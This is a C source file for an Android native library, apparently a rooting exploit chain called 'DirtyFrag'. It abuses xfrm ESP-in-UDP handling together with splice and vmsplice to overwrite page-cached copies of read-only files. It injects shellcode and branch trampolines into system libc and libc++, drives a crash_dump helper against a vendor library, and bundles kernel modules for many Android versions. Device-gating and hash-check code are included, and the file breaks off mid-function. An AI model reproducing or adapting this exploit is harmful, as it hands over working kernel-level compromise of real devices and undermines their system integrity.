#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <poll.h>
#include <sys/utsname.h>
#include <jni.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/system_properties.h>
#include "logging.h"
#include "target_profile.h"
#include "sha256.h"

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

jmethodID report_mid;

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    JNIEnv *env;
    (*vm)->GetEnv(vm, (void**) &env, JNI_VERSION_1_4);
    jclass clz = (*env)->FindClass(env, "org/lsposed/lspromise/DirtyFrag");
    report_mid = (*env)->GetMethodID(env, clz, "report", "(Ljava/lang/String;)V");
    return JNI_VERSION_1_4;
}

struct Reporter {
    JNIEnv *env;
    jobject obj;
};

static void report(struct Reporter *reporter, const char* msg) {
    if (!reporter) return;
    JNIEnv *env = reporter->env;
    jstring s = (*env)->NewStringUTF(env, msg);
    (*env)->CallVoidMethod(env, reporter->obj, report_mid, s);
    (*env)->ExceptionClear(env);
    (*env)->DeleteLocalRef(env, s);
}

#define REPORT(...) (reportfmt(reporter, __VA_ARGS__))
#define REPORTLN(fmt, ...) (reportfmt(reporter, fmt "\n" __VA_OPT__(,) __VA_ARGS__))

static void reportfmt(struct Reporter *reporter, const char *fmt, ...) __attribute__((__format__(printf, 2, 3)));
static void reportfmt(struct Reporter *reporter, const char *fmt, ...) {
    if (!reporter) return;
    va_list va;
    va_start(va, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, va);
    report(reporter, buf);
}

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";

static const char *target_lib_path = "/vendor/lib64/libstagefrighthw.so";

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define PAYLOAD_LEN      128

/*
 * Fail-closed target gate (defined below); every page-cache corruption entry
 * point must pass it before touching a file.
 *
 * `artefacts` selects which pinned userspace artefacts are hashed (Gate B/F).
 * Each stage passes the artefact IT is about to write, and only that one: this
 * chain rewrites the vendor file, libc and libc++ in the page cache, so a stage
 * that re-hashed an artefact an earlier stage already patched would compare
 * against the pristine pinned digest and abort the chain on its own writes.
 * Scoping the check keeps every pinned artefact validated exactly once, while
 * it is still pristine, immediately before it is written - a hash mismatch
 * remains a hard, fail-closed refusal.
 */
#define DFR_ART_CRASHDUMP 0x1
#define DFR_ART_VENDOR    0x2
#define DFR_ART_LIBC      0x4
#define DFR_ART_LIBCXX    0x8
static int gate_target(struct Reporter *reporter, dfr_target_class *out_cls,
                       int artefacts);

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len) {
    struct rtattr *rta = (struct rtattr *) ((char *) nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int del_sa(int fd, uint32_t spi)
{
    char buffer[256];
    struct nlmsghdr *nlh = (struct nlmsghdr *)buffer;
    struct xfrm_usersa_id *sa_id;

    //LOGD("delete spi %x", spi);

    memset(buffer, 0, sizeof(buffer));
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*sa_id));
    nlh->nlmsg_type = XFRM_MSG_DELSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = 2;

    sa_id = (struct xfrm_usersa_id *)NLMSG_DATA(nlh);

    sa_id->daddr.a4 = inet_addr("127.0.0.1");;
    sa_id->spi = htonl(spi);
    sa_id->family = AF_INET;
    sa_id->proto = IPPROTO_ESP;

    if (send(fd, nlh, nlh->nlmsg_len, 0) < 0) {
        PLOGE("del_sa send");
        //close(fd);
        return -1;
    }
    char rbuf[4096];
    int n = recv(fd, rbuf, sizeof(rbuf), 0);
    if (n < 0) {
        PLOGE("del_sa recv");
        //close(fd);
        return -1;
    }
    struct nlmsghdr *rh = (struct nlmsghdr *) rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) {
            if (e->error != -EEXIST) {
                //LOGE("del_sa nlmsg err: %d", e->error);
            }
            //close(fd);
            return e->error;
        }
    }

    return 0;
}


static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi) {
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) {
        PLOGE("socket");
        return -1;
    }
    struct sockaddr_nl nl = {.nl_family = AF_NETLINK};
    if (bind(sk, (struct sockaddr *) &nl, sizeof(nl)) < 0) {
        PLOGE("bind");
        close(sk);
        return -1;
    }

    del_sa(sk, spi);

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *) buf;
    nlh->nlmsg_type = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *) NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi = htonl(spi);
    xs->id.proto = IPPROTO_ESP;
    xs->saddr.a4 = inet_addr("127.0.0.1");
    xs->family = AF_INET;
    xs->mode = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid = 0x1234;
    xs->flags = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit = (uint64_t) -1;
    xs->lft.hard_byte_limit = (uint64_t) -1;
    xs->lft.soft_packet_limit = (uint64_t) -1;
    xs->lft.hard_packet_limit = (uint64_t) -1;
    xs->sel.family = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *) alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *) alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        enc.encap_oa.a4 = 0;
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *) esn_buf;
        esn->bmp_len = 1;
        esn->oseq = 0;
        esn->seq = REPLAY_SEQ;
        esn->oseq_hi = 0;
        esn->seq_hi = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
        PLOGE("send");
        close(sk);
        return -1;
    }
    char rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) {
        PLOGE("recv");
        close(sk);
        return -1;
    }
    struct nlmsghdr *rh = (struct nlmsghdr *) rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) {
            if (e->error != -EEXIST)
                LOGE("nlmsg err: %d", e->error);
            close(sk);
            return e->error;
        }
    }
    close(sk);
    return 0;
}

#define BATCH 8

#define DEBUG_SPLICE_HELPER 0

static int do_one_write(int file_fd, off_t offset, uint32_t spi, int use_helper) {
    int ret = -1;
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) {
        PLOGE("socket");
        return -1;
    }
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = {inet_addr("127.0.0.1")},
    };
    if (bind(sk_recv, (struct sockaddr *) &sa_d, sizeof(sa_d)) < 0) {
        PLOGE("bind");
        goto out_close_1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        PLOGE("setsockopt");
        goto out_close_1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) {
        PLOGE("socket2");
        goto out_close_1;
    }
    if (connect(sk_send, (struct sockaddr *) &sa_d, sizeof(sa_d)) < 0) {
        PLOGE("connect");
        goto out_close_2;
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        PLOGE("pipe");
        goto out_close_2;
    }

    uint8_t hdr[24];
    *(uint32_t *) (hdr + 0) = htonl(spi);
    *(uint32_t *) (hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = {.iov_base = hdr, .iov_len = sizeof(hdr)};
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t) sizeof(hdr)) {
        PLOGE("vmsplice");
        goto out_close_3;
    }
    off_t off = offset;
    ssize_t s;
    if (use_helper) {
        s = -1;
#if DEBUG_SPLICE_HELPER
        int logpipe[2] = {-1,-1};
        if (pipe(logpipe) < 0) {
            PLOGE("make log pipe");
            goto out_close_3;
        }
#endif
        char buf2[18];
        snprintf(buf2, sizeof(buf2), "%lu", off);

        int pid = syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
        if (pid < 0) {
            PLOGE("vfork");
            goto out_close_logpipe;
        } else if (pid == 0) {
#if DEBUG_SPLICE_HELPER
            close(logpipe[0]);
            if (logpipe[1] != 0 && dup2(logpipe[1], 0) < 0) {
                PLOGE("dup logpipe");
            }
            close(logpipe[1]);
#endif
            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) {
                PLOGE("setfd");
                _exit(1);
            }
            execl(kCrashDump, "crashdump64", buf2, target_lib_path, NULL);
            _exit(1);
        } else {
            //LOGD("pid: %d", pid);
#if DEBUG_SPLICE_HELPER
            close(logpipe[1]);
            logpipe[1] = -1;
#endif
            int status;
            if (TEMP_FAILURE_RETRY(waitpid(pid, &status, 0)) < 0) {
                PLOGE("waitpid");
                goto out_close_logpipe;
            }
            if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
                LOGE("not return success: status=%x signaled=%d ret=%d", status, WIFSIGNALED(status), WEXITSTATUS(status));
#if DEBUG_SPLICE_HELPER
                struct pollfd pollfds = {.fd = logpipe[0], .events = POLLIN, .revents = 0};
                for (;;) {
                    if (TEMP_FAILURE_RETRY(poll(&pollfds, 1, 0)) < 0) {
                        PLOGE("no events");
                        break;
                    }

                    if (pollfds.revents & ~POLLIN) {
                        LOGE("has other events than pollin: %x", pollfds.revents);
                        break;
                    }

                    char logbuf[64];
                    ssize_t rd = read(logpipe[0], logbuf, sizeof(logbuf));
                    if (rd < 0) {
                        PLOGE("rd");
                        break;
                    }

                    char outbuf[64*2+16];
                    char *p = outbuf;
                    for (ssize_t j = 0; j < rd; j++) {
                        snprintf(p, outbuf + sizeof(outbuf) - p, "%02x", logbuf[j]);
                        p += strlen(p);
                    }
                    LOGD("log buf: %s", outbuf);
                }
                goto out_close_logpipe;
#endif
            }
        }
        s = 16;

        out_close_logpipe:
#if DEBUG_SPLICE_HELPER
        if (logpipe[0] >= 0) close(logpipe[0]);
        if (logpipe[1] >= 0) close(logpipe[1]);
#endif
        if (s != 16) {
            LOGE("splicehelper error");
            goto out_close_3;
        }
    } else {
        s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
        if (s != 16) {
            PLOGE("splice %zu", s);
        }
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    /* still proceed regardless of splice rc — kernel may have already
     * decrypted the page in the time between splice and recv */
    // we may not need this.
    // usleep(150 * 1000);

    ret = s == 40 ? 0 : -1;

out_close_3:
    close(pfd[0]);
    close(pfd[1]);
out_close_2:
    close(sk_send);
out_close_1:
    close(sk_recv);
    return ret;
}

static int patch_file(const char *path, char *addr, size_t len, size_t foff, int beginspi, int use_helper, struct Reporter *reporter) {
    int file_fd;
    if (use_helper) {
        file_fd = -1;
    } else {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            PLOGE("open");
            return -1;
        }
    }
    /* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
     * desired payload word in its seq_hi field. */
    for (int i = 0; i < len / 4; i++) {
        uint32_t spi = beginspi + i;
        uint32_t seqhi =
            ((uint32_t) addr[i * 4 + 0] << 24) |
            ((uint32_t) addr[i * 4 + 1] << 16) |
            ((uint32_t) addr[i * 4 + 2] << 8) |
            ((uint32_t) addr[i * 4 + 3]);
        int ret = add_xfrm_sa(spi, seqhi);
        if (ret < 0) {
            LOGE("add_xfrm_sa #%d failed: %d", i, ret);
            close(file_fd);
            return -1;
        }
        //LOGI("%d: %02x %02x %02x %02x", i, addr[i*4], addr[i*4+1], addr[i*4+2], addr[i*4+3]);
    }
    LOGI("installed %zu xfrm SAs", len / 4);
    LOGD("patch at offset %zu", foff);
    //REPORTLN("patch at offset %zu", foff);

    for (int i = 0; i < len / 4; i++) {
        uint32_t spi = beginspi + i;
        off_t off = foff + i * 4;
        if (do_one_write(file_fd, off, spi, use_helper) < 0) {
            LOGW("do_one_write #%d at off=0x%lx failed", i, (long) off);
            close(file_fd);
            return -1;
        }
        //LOGD("do_one_write #%d at off=0x%lx", i, (long) off);
        if (i % 100 == 0) {
            LOGD("wrote %d", i * 4);
            REPORT("%d ...", i*4);
        }
    }
    LOGI("wrote %d bytes to %s starting at 0x%x", len, path, foff);
    //REPORTLN("\nwrote %d bytes to %s starting at 0x%x", len, path, foff);
    REPORTLN("patched %zu bytes", len);
    // not close, hold it
    // LOGD("leaked fd %d", file_fd);
    close(file_fd);
    return 0;
}

extern char stage1_start[];
extern char stage1_data[];
extern uint32_t stage1_len;
extern char stage1_first_inst_copy[];

extern char stage2_start[];
extern char stage2_data[];
extern uint32_t stage2_len;
extern char stage2_first_inst_copy[];

int find_hook_target(const char *libcxx, const char* symname, uint64_t *hook_target, uint64_t *payload_target, uint32_t* first_instruction);

int patch_libc(struct Reporter *reporter) {
    /* Independent JNI entry point: re-run the fail-closed gate so patchLibc()
     * cannot corrupt libc on a mismatched device without patch_ko() having run. */
    if (gate_target(reporter, NULL, DFR_ART_LIBC) != 0) {
        REPORTLN("[DFR][TARGET] aborting patch_libc: target gate refused");
        return 1;
    }
    uint64_t hook_offset, shellcode_offset;
    uint32_t first_insn;
    int ret;
    ret = find_hook_target("/system/lib64/libc.so",  "__libc_init", &hook_offset, &shellcode_offset, &first_insn);
    if (ret) {
        LOGE("find_hook_target");
        REPORTLN("find libc hook target failed");
        return ret;
    }

    LOGD("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);
    // REPORTLN("hook libc offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage2_len);

    // Aarch64 branch
    const uint32_t BRANCH = 0x14000000;

    // Build branch instruction for first instruction of hook target.
    uint32_t hook_data = BRANCH;
    uint32_t start_offset = (char*)stage2_start - (char*)stage2_data;
    size_t offs = shellcode_offset + start_offset - hook_offset;
    LOGI("jump off %lx", offs);
    // REPORTLN("jump off %lx", offs);
    hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
    int hook_data_size = 4;
    LOGI("hook insn: %x", hook_data);
    // REPORTLN("hook insn: %x", hook_data);

    // Check if already hooked
    if (first_insn == hook_data) {
        LOGI("hook already installed, skipping re-patch");
        REPORTLN("hook already installed, skipping re-patch");
        return 0;
    }

    // Jump back to hook target + 4.
    uint32_t jmpback = BRANCH;
    jmpback |= (((hook_offset + 4) - (shellcode_offset + stage2_len - 4)) >> 2) & 0x3ffffff;
    *(uint32_t *)&stage2_data[stage2_len - 4] = jmpback;

    *(uint32_t *)&stage2_first_inst_copy[0] = first_insn;

    REPORTLN("Shell code size: %d 0x%x bytes", stage2_len, stage2_len);

    size_t foff = shellcode_offset;

    REPORTLN("* patch #3");
    ret = patch_file("/system/lib64/libc.so", stage2_data, stage2_len, foff, 0xDEADBE10, 0, reporter);
    if (ret) {
        LOGE("patch shellcode err %d", ret);
        REPORTLN("patch shellcode err: %d", ret);
        return ret;
    }

    REPORTLN("* patch #4");
    ret = patch_file("/system/lib64/libc.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
    if (ret) {
        REPORTLN("patching trampoline err %d", ret);
        LOGE("patch trampoline err %d", ret);
        return ret;
    }
    return 0;
}

int patch_cxx(int run_index, struct Reporter *reporter) {
    /* Independent JNI entry point: re-run the fail-closed gate so patchCxx()
     * cannot corrupt libc++ on a mismatched device without patch_ko() first. */
    if (gate_target(reporter, NULL, DFR_ART_LIBCXX) != 0) {
        REPORTLN("[DFR][TARGET] aborting patch_cxx: target gate refused");
        return 1;
    }
    uint64_t hook_offset, shellcode_offset;
    uint32_t first_insn;
    int ret;
    ret = find_hook_target("/system/lib64/libc++.so",  "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_", &hook_offset, &shellcode_offset, &first_insn);
    if (ret) {
        LOGE("find cxx hook target err: %d", ret);
        REPORTLN("find cxx hook target err: %d", ret);
        return ret;
    }

    LOGD("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);
    // REPORTLN("hook offset: %llx shellcode off %llx payload len %d", hook_offset, shellcode_offset, stage1_len);

    // Aarch64 branch
    const uint32_t BRANCH = 0x14000000;

    // Build branch instruction for first instruction of hook target.
    uint32_t hook_data = BRANCH;
    uint32_t start_offset = (char*)stage1_start - (char*)stage1_data;
    size_t offs = shellcode_offset + start_offset - hook_offset;
    LOGI("jump off %lx", offs);
    //REPORTLN("jump off %lx", offs);
    hook_data |= ((offs) >> 2) & ((1 << 26) - 1);
    int hook_data_size = 4;
    LOGI("hook insn: %x", hook_data);
    //REPORTLN("hook insn: %x", hook_data);

    // Check if already hooked
    if (first_insn == hook_data) {
        LOGI("hook already installed, skipping re-patch");
        REPORTLN("hook already installed, skipping re-patch");
        return 0;
    }

    //sprintf(stage1_filename, "/dev/.dirtypipe-%04d", run_index);
    //LOGI("Stage1 debug filename: %s", stage1_filename);
    // strcpy(stage1_stage2_libname, "");

    // Jump back to hook target + 4.
    uint32_t jmpback = BRANCH;
    jmpback |= (((hook_offset + 4) - (shellcode_offset + stage1_len - 4)) >> 2) & 0x3ffffff;
    *(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;

    *(uint32_t *)&stage1_first_inst_copy[0] = first_insn;

    //REPORTLN("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);

    size_t foff = shellcode_offset;

    LOGI("patching libc++ shellcode");
    REPORTLN("patch #5");
    ret = patch_file("/system/lib64/libc++.so", stage1_data, stage1_len, foff, 0xDEADBE10, 0, reporter);
    if (ret) {
        REPORTLN("patch libc++ shellcode err %d", ret);
        LOGE("patch libc++ shellcode err %d", ret);
        return ret;
    }

    REPORTLN("patch #6");
    LOGI("patching libc++ trampoline");
    ret = patch_file("/system/lib64/libc++.so", (char*) &hook_data, sizeof(hook_data), hook_offset, 0xDEADBCCC, 0, reporter);
    if (ret) {
        REPORTLN("patch libc++ trampoline err %d", ret);
        LOGE("patch libc++ trampoline err %d", ret);
        return ret;
    }
    return 0;
}

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_12_5_10_start\n"
    ".global dirtyfrag_ko_12_5_10_end\n"
    "dirtyfrag_ko_12_5_10_start:\n"
    ".incbin \"dirtyfrag-android12-5.10.ko\"\n"
    "dirtyfrag_ko_12_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_10_start\n"
    ".global dirtyfrag_ko_13_5_10_end\n"
    "dirtyfrag_ko_13_5_10_start:\n"
    ".incbin \"dirtyfrag-android13-5.10.ko\"\n"
    "dirtyfrag_ko_13_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_15_start\n"
    ".global dirtyfrag_ko_13_5_15_end\n"
    "dirtyfrag_ko_13_5_15_start:\n"
    ".incbin \"dirtyfrag-android13-5.15.ko\"\n"
    "dirtyfrag_ko_13_5_15_end:\n"
    ".global dirtyfrag_ko_14_5_15_start\n"
    ".global dirtyfrag_ko_14_5_15_end\n"
    "dirtyfrag_ko_14_5_15_start:\n"
    ".incbin \"dirtyfrag-android14-5.15.ko\"\n"
    "dirtyfrag_ko_14_5_15_end:\n"
    ".global dirtyfrag_ko_14_6_1_start\n"
    ".global dirtyfrag_ko_14_6_1_end\n"
    "dirtyfrag_ko_14_6_1_start:\n"
    ".incbin \"dirtyfrag-android14-6.1.ko\"\n"
    "dirtyfrag_ko_14_6_1_end:\n"
    ".global dirtyfrag_ko_15_6_6_start\n"
    ".global dirtyfrag_ko_15_6_6_end\n"
    "dirtyfrag_ko_15_6_6_start:\n"
    ".incbin \"dirtyfrag-android15-6.6.ko\"\n"
    "dirtyfrag_ko_15_6_6_end:\n"
    ".global dirtyfrag_ko_16_6_12_start\n"
    ".global dirtyfrag_ko_16_6_12_end\n"
    "dirtyfrag_ko_16_6_12_start:\n"
    ".incbin \"dirtyfrag-android16-6.12.ko\"\n"
    "dirtyfrag_ko_16_6_12_end:\n"
    ".global dirtyfrag_ko_17_6_18_start\n"
    ".global dirtyfrag_ko_17_6_18_end\n"
    "dirtyfrag_ko_17_6_18_start:\n"
    ".incbin \"dirtyfrag-android17-6.18.ko\"\n"
    "dirtyfrag_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n"
    ".global splice_helper_end\n"
    "splice_helper_start:\n"
    ".incbin \"splicehelper\"\n"
    "splice_helper_end:\n"
    );

extern char dirtyfrag_ko_12_5_10_start[];
extern char dirtyfrag_ko_12_5_10_end[];
extern char dirtyfrag_ko_13_5_10_start[];
extern char dirtyfrag_ko_13_5_10_end[];
extern char dirtyfrag_ko_13_5_15_start[];
extern char dirtyfrag_ko_13_5_15_end[];
extern char dirtyfrag_ko_14_5_15_start[];
extern char dirtyfrag_ko_14_5_15_end[];
extern char dirtyfrag_ko_14_6_1_start[];
extern char dirtyfrag_ko_14_6_1_end[];
extern char dirtyfrag_ko_15_6_6_start[];
extern char dirtyfrag_ko_15_6_6_end[];
extern char dirtyfrag_ko_16_6_12_start[];
extern char dirtyfrag_ko_16_6_12_end[];
extern char dirtyfrag_ko_17_6_18_start[];
extern char dirtyfrag_ko_17_6_18_end[];
extern char splice_helper_start[];
extern char splice_helper_end[];

/*
 * The compiled-in module table. Kernel-FAMILY selection (dfr_select_ko_image)
 * and the uname parse (dfr_parse_kernel_versions) live in target_profile.c so
 * that the identical logic is exercised by the off-device unit tests; this
 * table is the only part that must stay here because it points at the .incbin
 * payload symbols above. Behaviour is unchanged from upstream.
 */
static const struct KoImage ko_images[] = {
    {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
    {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
    {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
    {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
    {14, 6, 1, dirtyfrag_ko_14_6_1_start, dirtyfrag_ko_14_6_1_end},
    {15, 6, 6, dirtyfrag_ko_15_6_6_start, dirtyfrag_ko_15_6_6_end},
    {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
    {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
};
#define KO_IMAGES_N (sizeof(ko_images) / sizeof(ko_images[0]))

static const struct KoImage *select_ko_image(int android_release, int kver_major, int kver_minor) {
    return dfr_select_ko_image(ko_images, KO_IMAGES_N, android_release, kver_major, kver_minor);
}

static int read_device_versions(int *android_release, int *kver_major, int *kver_minor) {
    struct utsname u;
    if (uname(&u) != 0)
        return -1;
    return dfr_parse_kernel_versions(u.release, android_release, kver_major, kver_minor);
}

/* -------- Gate A/B: fail-closed target identity + userspace validation -------- */

static void prop_get(const char *key, char *out, size_t outlen, const char *dflt) {
    char buf[PROP_VALUE_MAX];
    int n = __system_property_get(key, buf);
    if (n <= 0) {
        snprintf(out, outlen, "%s", dflt ? dflt : "");
    } else {
        snprintf(out, outlen, "%s", buf);
    }
}

/* Compare one userspace artefact's SHA-256 against the profile; log the gate. */
static int gate_hash(struct Reporter *reporter, const char *tag,
                     const char *path, const char *expected, int required) {
    if (expected == NULL || expected[0] == 0) {
        if (required) {
            /*
             * An artefact this stage is about to WRITE must have an established
             * pristine identity. "We never captured the hash" is not evidence of
             * a match, so on the exact target it is a refusal, not an UNKNOWN.
             */
            REPORTLN("[DFR][USERSPACE] %s FAIL required hash is not pinned path=%s", tag, path);
            return -1;
        }
        REPORTLN("[DFR][USERSPACE] %s UNKNOWN (no pinned hash) path=%s", tag, path);
        return 0;
    }
    char hex[65];
    if (dfr_sha256_file_hex(path, hex) != 0) {
        REPORTLN("[DFR][USERSPACE] %s FAIL cannot read %s (errno=%d)", tag, path, errno);
        return -1;
    }
    if (strcmp(hex, expected) != 0) {
        REPORTLN("[DFR][USERSPACE] %s FAIL %s", tag, path);
        REPORTLN("[DFR][USERSPACE]   expected=%s", expected);
        REPORTLN("[DFR][USERSPACE]   actual  =%s", hex);
        return -1;
    }
    REPORTLN("[DFR][USERSPACE] %s PASS %s", tag, path);
    return 0;
}

/*
 * Gate A (target detection) + Gate B (kernel/userspace validation).
 * Returns:
 *   0  -> proceed (exact ZZIC validated, or an unrelated upstream device)
 *  -1  -> refuse (ZZIC mismatch, or a ZZIC identity that fails validation)
 * FAIL-CLOSED: on the ZZIC target every Gate B boundary must PASS or the whole
 * chain aborts before a single page-cache write happens.
 */
static int gate_target(struct Reporter *reporter, dfr_target_class *out_cls,
                       int artefacts) {
    char manufacturer[128], model[128], device[128], display[192], fingerprint[256];
    char abi[64], sdkstr[32], relstr[32];
    if (out_cls) *out_cls = DFR_TARGET_UPSTREAM_GENERIC;
    prop_get("ro.product.manufacturer", manufacturer, sizeof(manufacturer), "");
    prop_get("ro.product.model", model, sizeof(model), "");
    prop_get("ro.product.device", device, sizeof(device), "");
    prop_get("ro.build.display.id", display, sizeof(display), "");
    prop_get("ro.build.fingerprint", fingerprint, sizeof(fingerprint), "");
    prop_get("ro.product.cpu.abi", abi, sizeof(abi), "");
    prop_get("ro.build.version.sdk", sdkstr, sizeof(sdkstr), "0");
    prop_get("ro.build.version.release", relstr, sizeof(relstr), "0");

    struct utsname u;
    memset(&u, 0, sizeof(u));
    uname(&u);
    long page_size = sysconf(_SC_PAGESIZE);

    struct ObservedTarget obs = {
        .manufacturer = manufacturer, .model = model, .device = device,
        .sdk = atoi(sdkstr), .android_release = atoi(relstr),
        .display = display, .fingerprint = fingerprint,
        .kernel_release = u.release, .kernel_version = u.version,
        .kernel_arch = u.machine, .page_size = page_size, .abi = abi,
    };

    REPORTLN("[DFR][TARGET] ENTER");
    REPORTLN("[DFR][TARGET] TARGET_MANUFACTURER=%s", manufacturer);
    REPORTLN("[DFR][TARGET] TARGET_MODEL=%s", model);
    REPORTLN("[DFR][TARGET] TARGET_DEVICE=%s", device);
    REPORTLN("[DFR][TARGET] TARGET_DISPLAY=%s", display);
    REPORTLN("[DFR][TARGET] TARGET_FINGERPRINT=%s", fingerprint);
    REPORTLN("[DFR][TARGET] TARGET_SDK=%d", obs.sdk);
    REPORTLN("[DFR][TARGET] TARGET_ANDROID_RELEASE=%d", obs.android_release);
    REPORTLN("[DFR][TARGET] TARGET_KERNEL_RELEASE=%s", u.release);
    REPORTLN("[DFR][TARGET] TARGET_KERNEL_VERSION=%s", u.version);
    REPORTLN("[DFR][TARGET] TARGET_PAGE_SIZE=%ld", page_size);
    REPORTLN("[DFR][TARGET] TARGET_ABI=%s", abi);

    struct TargetMatch m;
    dfr_target_class cls = dfr_classify_target(&obs, &m);
    const struct TargetProfile *p = &DFR_PROFILE_ZZIC;
    if (out_cls) *out_cls = cls;

